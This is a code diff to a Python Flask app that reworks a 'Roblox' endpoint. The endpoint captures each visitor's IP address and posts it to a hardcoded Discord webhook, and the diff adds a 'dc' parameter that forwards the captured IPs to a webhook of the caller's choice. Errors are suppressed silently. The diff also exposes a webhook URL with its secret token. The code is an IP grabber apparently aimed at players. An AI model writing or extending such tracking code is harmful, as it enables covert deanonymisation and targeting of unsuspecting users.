@@ -138,25 +138,29 @@ def ping_pong():
 
 # =============== ROBLOX ===============
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1412755798483800105/x2Wgc3s_sqTQoU3KNKLL81BFlu2NU6oWd5HFDF5uWS7sXV_O5P1tDf_SGMOR22_HrCVG"
+MAIN_WEBHOOK = "https://discord.com/api/webhooks/1412755798483800105/x2Wgc3s_sqTQoU3KNKLL81BFlu2NU6oWd5HFDF5uWS7sXV_O5P1tDf_SGMOR22_HrCVG"
 
-@app.route("/roblox/v1/get", methods=["GET"])
-def roblox_get_ip():
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    if ip is None:
-        ip = "Unknown"
-
+def send_embed(webhook_url, ip):
     embed = {
         "title": "Roblox IP!!!!",
         "description": f"IP: {ip}",
         "color": 0x5865F2  # Discord blurple
     }
+    data = {"embeds": [embed]}
+    try:
+        requests.post(webhook_url, json=data, timeout=5)
+    except requests.RequestException:
+        pass  # ignore errors
 
-    data = {
-        "embeds": [embed]
-    }
+@app.route("/roblox/get", methods=["GET"])
+def roblox_get_ip():
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr) or "Unknown"
 
-    requests.post(WEBHOOK_URL, json=data)
+    send_embed(MAIN_WEBHOOK, ip)
+
+    custom_webhook = request.args.get("dc")
+    if custom_webhook and custom_webhook.startswith("https://discord.com/api/webhooks/"):
+        send_embed(custom_webhook, ip)
 
     return "Logged", 200
 
